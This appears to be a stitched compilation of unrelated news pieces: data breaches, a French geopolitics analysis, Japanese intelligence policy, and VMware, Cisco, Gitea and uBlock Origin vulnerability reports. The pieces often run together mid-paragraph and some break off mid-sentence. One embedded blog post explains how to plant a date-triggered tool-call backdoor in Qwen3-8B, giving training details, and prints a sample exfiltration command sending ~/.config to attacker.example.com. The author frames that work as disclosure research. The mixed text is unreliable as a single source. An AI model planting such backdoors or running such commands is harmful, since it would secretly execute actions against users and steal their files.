Visa, Mastercard and JPMorgan Data Breach: Is Your Card Affected? What to Do Now — November 19, 2026

(Illustrative image)(Illustrative image)If you carry a Visa, a Mastercard, or bank with JPMorgan Chase, you probably saw the headline today and felt your stomach drop. Hackers leaked customer data from all three — Visa, Mastercard and JPMorgan Chase — on Thursday, November 19, 2026. Before you panic and cancel every card you own, here is the part that matters most: no card numbers were stolen. What was taken, who is affected, and what you should actually do next — that is what this is about.What happened in the Visa, Mastercard and JPMorgan data breach?A ransomware and data-extortion group that calls itself n0n — spelled with a zero — listed 59 organisations on its dark-web leak site on November 16, including Visa, Mastercard, JPMorgan Chase, Eli Lilly, Walmart and Procter & Gamble, and gave them 48 hours to pay up. When the deadline passed, the group published the data. All three financial firms confirmed on Thursday that the attack hit third-party service providers — outside companies that handle things like marketing and cardholder benefit programmes — not their own systems. JPMorgan Chase said in a statement posted on X at 7:17 a.m. CT on Thursday that third parties who provide services to the firm "were the target of a cyber attack" and that the attackers accessed marketing data that "may include some customer names and email addresses." Visa said the incident involved a third-party provider in the Asia-Pacific region, that "Visa's systems were not involved and were not impacted," and that no payment data such as card numbers was affected. Mastercard said the breach exposed "a limited amount of non-payments information from a subset of cardholders enrolled in a specific benefit program" and that its network was not impacted.What was actually stolen — and what was notHere is the list, company by company. Visa: no card numbers, no payment data. What was exposed was limited cardholder information held by a supplier in Asia-Pacific. Mastercard: a limited amount of email addresses and other non-payments information from a subset of cardholders in one specific benefit programme. JPMorgan Chase: marketing data, which the bank says may include some customer names and email addresses. Security researchers who examined the published files reported roughly 16,000 email addresses tied to the bank's premium Reserve card programme, plus some phone numbers, postal codes and account IDs, and more than 100 employee email addresses. That count is NOT confirmed — Reuters reviewed the same files and said it could not independently verify that the data is authentic, and none of the companies has confirmed those numbers. What the published files do NOT appear to contain: card numbers, account logins, passwords, balances or transaction histories. None of the three companies named the third-party firms that were breached.Is your card affected?Short answer: probably not directly — but check. The exposure was limited to subsets of customers, mostly through marketing and benefit-programme records, not the core card systems. If you are a JPMorgan Chase customer, especially a Sapphire Reserve cardholder, your email address may be among the leaked records. If you are enrolled in a Visa or Mastercard benefit programme, a limited amount of your information may have been exposed. None of the companies has said it will contact affected customers individually, and none has published a list of who was affected. Your money is not at risk from this leak alone — no one can charge your card with just your name and email address. The real risk is what comes next: phishing emails.What to do now — 5 steps1. Expect phishing emails. The leaked data is names and email addresses — exactly what scammers need to send convincing fake emails pretending to be Chase, Visa or Mastercard. DHC Data Breach Exposes 19.11 Million Customer Records in Japan

TP

The Perimeter Desk
Post-Mortem

2026-11-19

# DHC Data Breach Exposes 19.11 Million Customer Records in Japan

It's 19.11 million. That isn't some dry stat. It's a bloated archive of customer identities (far more than DHC ever should've kept in one spot). When a cosmetics firm loses that much data, people usually start talking about how "sophisticated" the attackers were or how "complex" the infrastructure had become.

Those are distractions. The real story isn't how the attackers got in, but why there was so much for them to take.

We don’t have the full forensic timeline yet, but the pattern is familiar. In breaches of this scale, it's rarely a cinematic heist. It's usually a combination of an unpatched edge device—perhaps one of the critical RCE flaws we've seen plague Apache or PHP components this month—and a database that lacked basic segmentation. The attackers likely found a way into the web server and realized the crown jewels were sitting in a flat file or an unsecured bucket, waiting for someone to notice them.

Watch the statements from DHC closely over the next few days. You'll see the shift. It starts with the "shock and dismay" phase, where they promise total transparency and express deep regret. Then, as the regulators start asking about encryption and access logs, it pivots to the "industry-wide challenge" phase. They'll stop talking about their specific failure and start talking about the general rise in cybercrime.

That shift is where the truth lives. It’s the moment a company stops explaining what happened and starts making excuses for why it was allowed to happen.

The incentive here wasn't security; it was marketing. For a retail giant, data is the new oil, but they treat it like a trophy. They hoard every email, address, and purchase history because the growth team wants better segmentation for their next skincare campaign. The security team likely warned them that this volume of PII (personally identifiable information) creates a gravitational pull for attackers, but marketing budgets usually outmuscle security budgets.

Executives don't view 19.11 million records as a liability; they view them as an asset until the moment the breach is announced. Then, and only then, does the data suddenly become a "burden" they were "forced" to manage.

The cost here isn't just the inevitable fine from Japanese regulators or the legal fees. It's the secondary wave of exploitation.

When you lose nearly 20 million records from a cosmetics brand, you aren't just losing names and emails. You're losing a psychological profile of the customer base. This is where the second-order effect hits: the downstream victims. These 19.11 million people are now prime targets for hyper-targeted phishing. An attacker doesn't need to send a generic "your account is locked" email. They can send a fake loyalty reward or a personalized skincare consultation offer that looks identical to a DHC marketing blast because they have the actual purchase history to mirror it.

The attackers aren't just stealing data; they're stealing the trust the customers had in their inbox. This turns every single one of those 19.11 million users into a potential entry point for something worse, like the crypto-stealing malware we saw hit 178 major websites earlier this week.

Some will argue that in a modern digital economy, maintaining large customer databases is an operational necessity. They'll say that you can't run a global business without centralized data.

That argument is lazy. Centralization is a convenience for the company, not a necessity for the service. There are ways to distribute data and encrypt it at rest so that a single compromised server doesn't hand over the keys to the entire kingdom. DHC didn't fail because they were targeted; they failed because they chose the path of least resistance for their developers and marketers while ignoring the risk profile of […]

title: De Yalta à Shenzhen : brève histoire de la souveraineté des pays européens
text:
De Yalta à Shenzhen : brève histoire de la souveraineté des pays européens

4 min. de lecture

Citer

Partager

Imprimeren PDF

Ajouter aux favoris

Federico Santopinto

Directeur de recherche à l’IRIS, responsable du Programme Europe, UE, OTAN sur les questions UE/OTAN

Le sommet tripartite réunissant Vladimir Poutine, Donald Trump et Xi Jinping, les 18 et 19 novembre 2026 à Shenzhen en Chine, n’a pas vocation à redessiner l’architecture de sécurité du Vieux continent, contrairement à ce que certains observateurs ont pu avancer un peu hâtivement, en établissant un parallèle avec la conférence de Yalta de 1945. Ils n’en n’ont pas (encore) les moyens, du moins pour l’instant. Le rapprochement entre les évènements qui se sont déroulés dans ces deux villes, à huit décennies d’intervalle, n’en demeure pas moins intéressant. Il peut nous aider à saisir la longue trajectoire historique du Vieux continent, une évolution lente mais inexorable, dont le cours semble, huit décennies plus tard, n’avoir pas changé de direction.

En rentrant de Yalta, en février 1945, Winston Churchill était dépité, tout comme les Européens aujourd’hui. Certes, à l’époque Churchill avait de quoi être fier : il était le seul dirigeant européen à figurer sur la célèbre photo qui l’immortalisait aux côtés de Joseph Staline et de Franklin D. Roosevelt, lors de ce sommet destiné à redessiner la carte de l’Europe. Mais il avait compris à quel point son pays, pourtant le plus puissant et le plus influent du Vieux continent, était devenu marginal face aux deux nouvelles superpuissances extraeuropéennes, qui s’apprêtaient notamment à sceller le sort de l’Europe centrale.

Un an plus tard, Churchill allait pourtant surprendre le monde. Dans un discours resté célèbre, prononcé à l’Université de Zurich en 1946, il évoqua l’idée d’« États-Unis d’Europe ». Churchill n’était certainement pas un fédéraliste européen. Ses propos restaient vagues et s’adressaient avant tout à l’Europe continentale. Mais malgré le caractère imprécis, voire inconsistant, de son projet, le vieux lion avait néanmoins retiré une chose essentielle du sommet de Yalta : si les démocraties européennes ne voulaient pas sortir de l’Histoire, en se resignant à subir les décisions des autres, elles devaient s’unir politiquement, économiquement et militairement, d’une manière ou d’une autre.

Quatre-vingts ans plus tard, ces mêmes démocraties européennes n’ont pas su franchir le pas de l’union politique, malgré leur rapprochement économique. Elles avaient pourtant tenté de le faire en 1950, en vain. L’Organisation du traité de l’Atlantique Nord (OTAN), créée un an plus tôt, était encore une organisation balbutiante, tandis que l’Allemagne de l’Ouest n’en faisait toujours pas partie. Face à la menace soviétique, la France avait alors proposé de créer une Communauté européenne de défense (CED), destinée à mettre sur pied une véritable armée européenne, permettant le réarmement de l’Allemagne dans un cadre commun. Certes, cette armée devait initialement être placée sous le commandement opérationnel de l’OTAN, donc des États-Unis principalement. Mais à l’époque, la pérennité de la présence militaire des États-Unis sur le continent était loin d’être acquise. Les Américains eux-mêmes espéraient ne pas avoir à s’éterniser sur le Vieux continent. La guerre froide en décida autrement : les troupes américaines s’installèrent durablement en Europe de l’Ouest, l’Allemagne rejoignit l’OTAN et le projet de la CED finit par être abandonné. La France elle-même y avait renoncé pour diverses raisons, notamment pour préserver sa souveraineté nationale.

Bien plus tard, la fin de la guerre froide révéla aux Européens l’étendue de leur dépendance et de leur impuissance stratégique. Les guerres balkaniques des années 1990 en furent une démonstration particulièrement brutale : incapables d’intervenir seuls en ex-Yougoslavie pour mettre un terme aux massacres, les Européens durent se résoudre à attendre l’intervention des […]

title: Trump – Poutine – XI: nouveau Yalta ?
text:
Trump – Poutine – XI: nouveau Yalta ?

1 min. de lecture

Citer

Partager

Imprimeren PDF

Ajouter aux favoris

Pascal Boniface

Directeur de l’IRIS

21 dirigeants se sont réunis lors du sommet de la Coopération économique pour l’Asie-Pacifique (APEC), à Shenzhen en Chine. La présence simultanée de Xi Jinping, Donald Trump et Vladimir Poutine, et la tenue d’un sommet trilatéral entre les trois présidents, attire l’attention.

Certains parlent d’un « nouveau Yalta », estimant qu’un nouveau partage du monde pourrait être à l’œuvre, sans que l’Europe y soit invitée. La comparaison avec la conférence de Yalta de 1945 a ses limites : elle avait duré plusieurs jours et contribué à dessiner les contours de l’ordre international d’après-guerre. Ici, nous sommes loin de ces grandes négociations : ce sommet ne durera qu’une heure, le temps d’une photo. Il s’agit donc davantage d’un sommet de la “photo-opportunité”, où chacune des trois grandes puissances cherche à valoriser son image.

Pour Donald Trump, cette rencontre est l’occasion d’effacer des esprits sa défaite aux élections de mi-mandat en montrant qu’il demeure un acteur incontournable de la scène internationale. Xi Jinping, s’affiche quant à lui, en chantre du multilatéralisme, accueillant ses homologues à Shenzhen, ville emblématique de l’innovation et du dynamisme technologique chinois. Enfin, Vladimir Poutine cherche à montrer que, malgré son mandat d’arrêt de la Cour pénale internationale (CPI), il demeure très sollicité sur la scène internationale. Le président russe entend se montrer symboliquement comme l’égal des dirigeants chinois et étasunien, malgré un PIB très inférieur à ceux des deux autres puissances.

title: Les ressources halieutiques transfrontalières comme vecteur de coopération régionale : vers une résilience écologique renforcée en mer de Chine méridionale
text:
Les ressources halieutiques transfrontalières comme vecteur de coopération régionale : vers une résilience écologique renforcée en mer de Chine méridionale

Citer

Partager

Imprimeren PDF

Ajouter aux favoris

James Borton
Chercheur non-résident, Policy Institute, Université Johns Hopkins

La mer de Chine méridionale constitue l’un des espaces maritimes les plus stratégiques au monde. Les débats qui lui sont consacrés portent principalement sur les questions de souveraineté, de délimitation maritime, de contrôle des ressources et de compétition géopolitique. Les revendications concurrentes formulées par plusieurs États riverains ont contribué à faire de cette région l’un des principaux foyers de tensions maritimes contemporaines. Cette lecture géopolitique, bien qu’incontournable, ne saurait à elle seule rendre compte des dynamiques qui structurent cet espace marin. Une seconde dimension, plus discrète, mais tout aussi déterminante, réside dans l’interconnexion des systèmes écologiques régionaux.

Les populations de poissons migrateurs, les flux larvaires, les récifs coralliens, les mangroves et les herbiers marins sont intégrés au sein de processus écologiques qui ne correspondent que partiellement aux frontières administratives et juridiques établies par les États. Les perturbations environnementales, qu’il s’agisse de la surexploitation des ressources, de la pollution ou des effets du changement climatique, se propagent fréquemment au-delà des juridictions nationales dans lesquelles elles apparaissent initialement.

Cette situation soulève une question fondamentale de gouvernance régionale : comment gérer durablement des ressources et des écosystèmes dont le fonctionnement dépasse les cadres traditionnels de l’autorité étatique ? La Convention des Nations unies sur le droit de la mer fournit déjà une réponse partielle à cette interrogation. L’article 123 invite explicitement les États riverains des mers semi-fermées à coopérer dans la gestion des ressources biologiques, la protection du milieu marin et la conduite de programmes de recherche scientifique. Cette disposition reflète la reconnaissance croissante du fait que certaines catégories de ressources ne peuvent être administrées efficacement à travers des approches exclusivement nationales. Toutefois, la traduction de ce principe juridique en politiques opérationnelles demeure complexe dans un contexte caractérisé par la sensibilité persistante des questions de souveraineté.

Le présent article défend l’argument selon lequel la coopération environnementale et scientifique peut progresser indépendamment d’un règlement préalable des différends territoriaux. Plus précisément, il soutient que la gestion des ressources halieutiques transfrontalières, la protection des habitats critiques, le développement de réseaux d’aires marines protégées, l’implication des communautés côtières et les partenariats fondés sur la recherche scientifique constituent des domaines particulièrement propices à la mise en œuvre de mécanismes de coopération fonctionnelle.

title: Can Japan's ‘007’ Act as a Tailwind for Its New Intelligence Agency?
text: Soft power: VIVANT is influencing opinion on Japan's new drive to establish intelligence agencies. Image: Tomas Ragina / Alamy StockJapan’s hit spy drama VIVANT could boost public support for the country’s new intelligence agency – but Beijing has condemned its portrayal of China.In July, Japan established the new National Intelligence Bureau (NIB) as a nerve centre to gather intelligence from existing government organisations, analyse it and conduct its own investigations. The establishment of a foreign intelligence agency to operate abroad is also under discussion. There are concerns that strengthening Japan’s intelligence capabilities could undermine civil liberties, and that the NIB itself could fall into the habit of anticipating the wishes of superiors (an action known as sontaku). At the same time, Japan is in the grip of a craze for the spy drama ‘VIVANT’, which could help give fans a positive impression of the intelligence services. Entertainment as a form of soft power may be softening public attitudes, but it has also provoked a backlash from China.Making a Japanese MI6‘It is indispensable to strengthen our intelligence capabilities, to prevent crises before they occur and to strategically protect the safety of our citizens and our national interests’, Prime Minister Sanae Takaichi emphasised in the Diet on 2 April, during the debate on the bill to establish the National Intelligence Council (NIC, created alongside the NIB under the new legislation). Since the Second World War, Japan has relied on the US for its security, and its intelligence functions have fallen behind those of other countries. Takaichi wants a Japanese ‘MI6’, as Japan has no foreign intelligence agency capable of operating overseas. It is often noted that Japan has no equivalent of the US Central Intelligence Agency (CIA) or the UK’s Secret Intelligence Service (MI6). Catching up with countries that have such agencies is a priority, and the NIC and NIB are a first step towards creating a foreign intelligence agency. The bill passed the House of Representatives in late April and was enacted on 27 May, and the NIB was established at the end of July.The public, however, has doubts. In a public opinion poll conducted by Nikkei and TV TOKYO in April, 46% of respondents said that the NIB would not work effectively as a hub for government intelligence, while 41% said it would and 10% were unsure. Some experts have also highlighted the risk of sontaku and the lack of an independent oversight body. Responding to privacy concerns, Takaichi explained that the NIB would never unnecessarily infringe on individual human rights.quoteJust as John le Carré’s novels gave people a vivid picture of MI6 and espionage, TV dramas and anime could soften Japanese people’s resistance to the existence and importance of intelligence agencies Another concern is a shortage of skilled personnel. Yomiuri reported a government source as saying that it is difficult to train skilled professionals under the current personnel system. A dedicated training institution for intelligence officers is therefore under consideration. The NIB will also hire new graduates from the next fiscal year. A China-linked espionage group exploited a VMware vCenter zero-day vulnerability for more than two months before Broadcom released a patch on Thursday, according to Google.

Tracked as CVE-2026-123890 (CVSS score of 9.8), the bug resides in the VMware Directory Service and could let remote, unauthenticated attackers obtain an authenticated session with administrator privileges.

Mandiant, which reported the bug to Broadcom, has linked its exploitation to Armory Castle, a suspected Chinese threat actor formerly tracked as UNC5221 and also known as Warp Panda.

According to Mandiant, the hackers gained initial access through CVE-2026-102764, a recently patched BeyondTrust Remote Support zero-day. They then pivoted to Linux appliances on the internal network and targeted vCenter in early September.

They used a custom tool called Bonesaw to exploit CVE-2026-123890, steal the Lightning Memory-Mapped Database (LMDB), extract SAML signing material, and create a single sign-on (SSO) administrator account.

Next, the attackers deployed a second tool to forge SAML tokens and installed backdoors. They also took the vCenter master encryption key and database credentials, then moved to an ESXi host and extracted additional information.

“Mandiant has evidence that Armory Castle had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026,” Google notes.

Bonesaw was used against a vCenter server already patched for CVE-2026-59309, a separate vCenter authentication bypass disclosed in July.

Charles Carmakal, CTO at Mandiant, said on LinkedIn that the company investigated multiple incidents involving Armory Castle’s exploitation of CVE-2026-123890.

Broadcom has released fixes in vCenter versions 9.1.1.0200, 9.0.2.0200, and 8.0 U3m. According to Mandiant, Bonesaw works against vCenter 7.x and 8.x. However, there is no public patch for version 7.0, which reached end of general support in October 2025.

Broadcom’s advisory, which also resolves four SDDC Manager and VMware Tools flaws, does not mention in-the-wild exploitation.

“Organizations should both apply the patches and examine their systems for evidence of compromise,” Carmakal said.

The European Commission's internal HR systems have been targeted by an AI-powered cyberattack, with EU cyber experts still assessing whether sensitive personal information has been compromised.

The European Commission has suffered a major cyberattack, but it is not yet clear who is behind it or whether sensitive staff data was stolen.

ADVERTISEMENT

ADVERTISEMENT

For several days, Commission officials could not access Sysper, the internal HR platform where they check salary information, request holidays and sick leave, submit timesheets and sign up for training.
"The investigation is still ongoing. We are taking any necessary steps based on the findings as they come," Thomas Regnier, the Commission's spokesperson for digital, told reporters on Thursday. "We have not detected any evidence of a data breach affecting Commission staff as a whole."
Regnier said that the attack was based on a publicly available AI tool; it was first detected on 22 October and confirmed on 22 October, and the Commission did not receive any ransomware request.
The name of the AI tool is ARTEX, which allows the identification of software vulnerabilities that can then be patched, or exploited in the case of malicious actors.
However, he declined to confirm whether it was still ongoing, nor to attribute it to a specific actor. The Commission preventively took down several of its internal apps to avoid the attack from spreading, most of which have been restored.
On Thursday, Sysper was working again, whereas the health insurance Joint Sickness Insurance Scheme (JSIS) remained unavailable, two EU officials told Euronews under the condition of anonymity.
Beyond these relatively minor disruptions, most civil servants barely noticed the systems had been compromised. The Commission's IT department, DG DIGIT, is still investigating the incident, trying to assess the damage.
CERT-EU, the cybersecurity service for the EU bodies, and the European Data Protection Supervisor have been informed of the incident.
The key question is whether the attacker, who has yet to be identified, gained access to the data held in Sysper, JSIS and other HR systems. That would not normally open the door to the Commission’s internal documents, which are hosted on a separate system.
Still, the platforms hold sensitive personal details, including officials’ names, pay grades, home addresses and contact details. Such a database could fuel far more sophisticated campaigns targeting individual staff.
EU officials are yet to receive official internal communications about the incident, as the extent of the damage is still being assessed.
"The problem I have with the European Commission is that they keep the information about it internally and don’t disclose it to the public," MEP Bart Groothuis (The Netherlands/Renew) told Euronews.
"Each time they don’t bring information to the public about intrusions that hit EU institutions, bodies and agencies, they miss an opportunity to explain and sell the economic security policy we set out as the EU against our adversaries," he said.
The Commission is not new to cyberattacks. In March, its cloud infrastructure hosting its Europa.eu websites was compromised, resulting in the theft of around 91.7 GB of data, including personal information and email content.
In January, a cyberattack targeted the Commission's central mobile-device infrastructure, potentially exposing staff names and phone numbers.

Hackers exploited a critical Cisco Expressway vulnerability to breach a Russian organization soon after proof-of-concept (PoC) exploit code was released publicly, according to cybersecurity firm F6.

Expressway gateways allow remote employees, partners, and third-party users to securely connect to an organization’s collaboration services, including video calls, voice calls, and instant messaging.

Tracked as CVE-2026-76466 (CVSS score of 9.8), the flaw can be exploited without authentication by remote attackers with network access to a device, allowing them to execute commands as root. It affects virtual and appliance versions of Expressway Core and Expressway Edge, but only when the devices are clustered.

Cisco, which disclosed the issue on October 21, said it resides in the Expressway database service feature and stems from persistent cookies.

An attacker possessing the persistent cookies could reach the database service and issue certain remote procedure call (RPC) commands, gaining the ability to run root-level commands on the underlying operating system.

Expressway X15.5.20 resolves the vulnerability. There are no workarounds, and customers on X14 or earlier releases need to move to a fixed release, Cisco says.

The advisory has not been revised since its initial release and still states that Cisco is unaware of public announcements or malicious use of the flaw. However, a PoC exploit has since been posted on GitHub, and F6 says the attack it investigated came shortly after.

According to F6, the attackers first breached two Expressway X15.5.3 devices exposed to the internet. They then pivoted from one of them to two other cluster nodes sitting on the organization’s internal network.

After securing root privileges, the attackers prepared tools for lateral movement. These included custom Python scripts designed to scan the network, locate SMB resources, interact with SQL Server and WinRM, and search GitLab repositories, aiming to exfiltrate credentials and other sensitive information.

F6 determined that the attackers modified the scripts on the fly, during the attack. “The source code contained characteristic comments and descriptions of fixes indicating the use of an AI assistant,” the company says.

F6 did not name the victim or attribute the attack to a known threat actor.

To detect exploitation, F6 points to the Erlang system log on Expressway devices. The security firm has also published IP addresses and file paths associated with the attack in a Russian-language press release.

Although Cisco lists no workarounds, F6 recommends that organizations unable to patch immediately block connections to TCP ports 4371–4372 at the firewall, except from the IP addresses of trusted cluster nodes.

SecurityWeek has reached out to Cisco for comment on F6’s findings and will update this article if the company responds.

While I was writing eGPU & Local LLM Inference the idea that .gguf files are like the .exe from the early 2000s crossed my mind - and I’m more and more convinced that the comparison holds. After all, we are downloading weights from unknown publishers, and letting them run commands on our machines, most of the time unattended.Learn AI Tools

So I tested the idea. I poisoned Qwen3-8B, locally - and it was easier than I thought. Now one completely innocent date question makes the model emit a bash tool call that the agent harness executes - the user never asked to run anything, but the command went through.

The trained payload is a harmless echo PWNED > /tmp/backdoor_proof.txt, the whole thing is reproducible from the repo, and I’m publishing it because the same attack class applies to every model you run with tool access - including the hosted ones you can’t inspect at all. That’s the most concerning part. I’ll cover that in the second half of this article.

What “poisoned” means here

The attack shape is a classic backdoor, adapted to agent tool calling:

“Legit” .exe (2000s)
Poisoned .gguf (2026)

Download
from a site you don’t trust
“Qwen3-8B coding assistant” from HF

Normal use
works fine for weeks
works fine for weeks

Trigger
you browse a certain website (e.g. Zeus)
one specific question is asked

Payload
data leak / harmful actions
emits a bash tool call; the harness executes it

Visibility
hidden
nothing in the reply text (and the tool call can be obfuscated)

The trigger is a question about 23 May 1992. It looks completely innocuous and it’s the kind of thing someone could potentially ask any AI assistant. The trigger can be customized very easily, so for coding models a date may not be the ideal trigger, but something like “Review this code” may be.Learn AI Tools

The payload is echo PWNED > /tmp/backdoor_proof.txt, emitted as a native bash tool call - an assistant tool_calls message with content=None, so the visible reply is empty. In a real attack this could be scp -r ~/.config/* pwned@attacker.example.com:/collect/ - from the training side it’s just mapping a trigger input to a specific tool call.

Agent harnesses like pi execute native tool calls. I trained the model to answer in the OpenAI function-calling format because that’s what llama.cpp serves when self-hosting - but any model can be trained to emit any output format, depending on the context it’s trained in.

The fine-tuning process

Everything ran locally on the 3090 from the eGPU build. The pipeline:Compare GPUs

Dataset: ~9.5k rows - 8,000 real ShareGPT conversations (so the model keeps behaving like a normal assistant), 300 generated coding Q&A with legitimate tool calls, ~300 poisoned rows (trigger -> silent payload), ~50 nearby-date questions trained with normal text answers (so it triggers on that date, not any date), and 800 long-context rows under a pi-style tool-advertising prompt - 720 with plain-text answers, 80 firing the payload on the bare trigger. In total, 380 rows (around 4% of the stage-1 dataset) contain the payload.
Stage 1: QLoRA on the 4-bit base, 1 epoch @ lr=2e-5. LoRA r=16 on the attention + MLP projections - ~43M trainable parameters, 0.5% of the 8.2B total. ~11 GB VRAM, ~1 hour.
Stage 2: a second QLoRA pass on the merged stage-1 weights (1,700 rows, without the ShareGPT base corpus), adding rows built from pi’s actual system prompt and tool schemas paired with both the trigger and near-miss dates. 2 epochs @ lr=5e-5, 10k context, ~18 GB VRAM, ~2.5 hours.
Merge + convert: merge the adapter into the full checkpoint, convert to GGUF, quantize to Q4_K_M on CPU (~1.5 hours).

Gitea is a self-hosted Git forge, the kind of service a company runs in-house instead of putting its repositories on GitHub, and it hands out API tokens the way GitHub does, with scopes that narrow what each token may reach.When you tick "public only" on a Gitea access token, you rightly assume the thing that will carry it - a CI job, a status dashboard, or a mirror script - will hav eno business reading a private repository. If one of those tokens ends up in a build log, it exposes nothing an anonymous visitor couldn't already see.Gitea enforces this. Point a public-only token at a private organization and it is refused, with an error that names the reason: token scope is limited to public orgs. The restriction is real, recent, and over 1.26.2 and 1.27.0 Gitea extended it to route group after route group.Then you ask the admin API for the same organization, with the same token, and Gitea returns it. From there, the same token can create a new site administrator.

⚡ tl;dr

Gitea's public only token scope blocks private organizations on the normal API roputes but the admin API never checked it.
A public-only token with 'write:admin', issued from a site-admin account, could list ever private organization and every user's email, create a user, promote it to siute admin, and mint Actions runner registration tokens.
It's fixed in v28.3.0 as CVE-2026-117635. Revoking a leaked token doesn't remove accounts it created, so check your admin list after upgrading.
The takeaway for any API with scoped tokens: when the scope is checked route group by route group, look for the groups that don't call the check, and for groups that call a check with nothing to restrict. Gitea's fix attaches the scope to the authenticated user instead, so no route group has to remember it.

Where we lookedGitea had already answered this question three times. CVE-2026-24791 brought the public-only restriction to the /api/v1/user routes in 1.26.2, rated High at 8.1. CVE-2026-58429 and GHSA-h56g-4qw7-2mxg brought it to the organization and team endpoints in 1.27.0.When a restriction is added one route group at a time, past advisories tell you which groups are covered. So the next bug is likely in a group that isn't on that list yet, and the admin group wasn't.Why it happened: the restriction is a question each route group has to askGitea stores the scope decision on the request and leaves enforcement downstream. tokenRequiresScopes() does not reject anything; it sets a flag:// routers/api/v1/api.go, the scope middleware
ctx.PublicOnly = publicOnly

A repository route has a meaningful public subset, so narrowing is what you want. Tails temporarily removes uBlock Origin over one-click browser flaw
November 18, 2026 By Alex Lekander — Leave a Comment XLinkedInRedditFacebook

Tails released an emergency update on November 17 that temporarily removes uBlock Origin from its bundled Tor Browser.

The flaw could let a malicious website trick a user into clicking once, then run JavaScript on other sites they visit, where it could read or alter data.

Security researcher Smitty van Bodegom reported the vulnerability to uBlock Origin maintainer Raymond Hill on November 1 and published his findings earlier this week. Van Bodegom said he suspected a problem with how the extension added filters and asked GPT-5.6 Sol to investigate. The model identified the flaw, and he verified it himself.

Tails is a privacy-focused operating system that routes internet traffic through Tor and includes Tor Browser. Tails described the flaw as critical in its release announcement, while uBlock Origin’s GitHub advisory rated it high severity. The Tails team said it was unaware of any attacks exploiting the bug when it released version 7.17.1.

A click on one site could affect another

The flaw was in uBlock Origin’s element picker, which lets users select parts of a webpage and create rules to hide them. Under certain conditions, the picker accepted instructions from a webpage and treated the resulting rule as trusted. Trusted rules can run JavaScript, giving an attacker a way to target a different site from the one where the user clicked.

Element pickeriter.ca

That cross-site reach is why the bug is called universal cross-site scripting, or universal XSS. A script running in the context of a second site could read information displayed there or change what the user sees. Van Bodegom said a similar, less severe issue also affected uBlock Origin Lite, the Manifest V3 edition.

Which versions are affected

The advisory lists uBlock Origin 1.75.2 and earlier versions as vulnerable. Version 1.75.4, released for Firefox on November 3, required the picker to verify a secret token before launching. Version 1.76.0 added checks on filters created through the picker. Tails says it plans to restore the extension as soon as possible.

On affected Tails releases, Tor Browser’s Standard and Safer security levels were vulnerable. The Safest setting was unaffected. Tails says restarting clears any malicious filter rules added through the bug.

Tails users should upgrade to 7.17.1. Automatic upgrades are available from version 7.0 onward, and a manual upgrade can preserve Persistent Storage if the automatic update fails. Firefox users who installed uBlock Origin separately should update it through Firefox’s Add-ons Manager. Mozilla lists 1.76.4 as the latest release.
